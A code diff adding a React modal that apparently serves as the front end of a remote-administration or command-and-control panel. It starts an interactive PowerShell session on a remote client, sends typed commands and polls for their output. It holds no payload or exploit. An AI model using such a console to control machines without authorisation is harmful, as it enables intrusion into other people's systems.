@@ -1,0 +1,111 @@
+import {Button, Form, Modal} from "react-bootstrap";
+import {Input} from "reactstrap";
+import React, {useEffect, useState} from "react";
+import styled from "@emotion/styled";
+import {sendCommand, sendPSCommand} from "../../../api/api";
+import axios from "../../../axios";
+
+
+const PowershellModal = (props) => {
+    const [show, setShow] = useState(false);
+    const [allResponses, setAllResponses] = useState([]);
+    const [currentCommand, setCurrentCommand] = useState(null)
+    const handleClose = () => setShow(false);
+    const handleShow = () =>  setShow(true);
+
+    const getResponse = () => {
+        axios({
+            headers: {
+                'Content-Type': 'application/json',
+                "x-access-token": localStorage.getItem('token')
+            },
+            url: `/api/response/ps/${props.clientId}`,
+            method: 'get',
+        })
+            .then(data => {
+                if (Object.keys(data.data).length !== 0) {
+                    setAllResponses(oldArray => [...oldArray, data.data.response]);
+                }
+            })
+            .catch(e => console.log(e.message))
+    }
+
+    useEffect(() => {
+        let handle = setInterval(getResponse, 2000);
+        return () => {
+            clearInterval(handle);
+        };
+    })
+
+
+    function firstCommandWrapper() {
+        sendCommand(props.clientId, "StartPS").then(r => r).catch(e =>console.log(e.message))
+        handleShow()
+    }
+
+    function closeWrapper(){
+        sendPSCommand(props.clientId, "exit").then(r => r).catch(e =>console.log(e.message))
+        handleClose()
+    }
+
+    async function sendCommandWrapper() {
+        await sendPSCommand(props.clientId, currentCommand).then().catch((err) =>
+            setAllResponses(oldArray => [...oldArray, `\n[-] Error in console ${err.message}`]))
+    }
+
+    return (
+        <>
+            <LaunchPowershellButton id="auto-complete-button" onClick={firstCommandWrapper}>
+                Launch Interactive Session
+            </LaunchPowershellButton>
+            <Modal backdrop={'static'} size={"xl"} show={show} onHide={handleClose} animation={false}>
+                <Modal.Header closeButton>
+                    <Modal.Title>Powershell Console</Modal.Title>
+                </Modal.Header>
+                <Modal.Body>
+                    <Input defaultValue={"Command"} onChange={e => {
+                        e.preventDefault()
+                        setCurrentCommand(e.target.value)
+                    }}/>
+                    <Form.Control disabled as="textarea" rows={10} value={allResponses}/>
+                </Modal.Body>
+                <Modal.Footer>
+                    <Button variant="secondary" onClick={closeWrapper}>
+                        Close
+                    </Button>
+                    <SendCommandButton variant="primary" onClick={sendCommandWrapper}>
+                        Send
+                    </SendCommandButton>
+                </Modal.Footer>
+            </Modal>
+        </>
+    )
+}
+export default PowershellModal;
+
+const LaunchPowershellButton = styled.button`
+  padding: 0.2em;
+  min-width: 2em;
+  margin: 0 auto;
+  width: 12em;
+  border-radius: 5px;
+  border: none;
+  cursor: pointer;
+  color: #fff;
+  font-weight: 600;
+  background-color: #98d14a;
+`
+
+const SendCommandButton = styled.button`
+  padding: 0.3em;
+  margin-left: 5px;
+  min-width: 2em;
+  width: 4em;
+  height: 3.7vh;
+  border-radius: 5px;
+  border: none;
+  cursor: pointer;
+  color: #fff;
+  font-weight: 600;
+  background-color: #98d14a;
+`
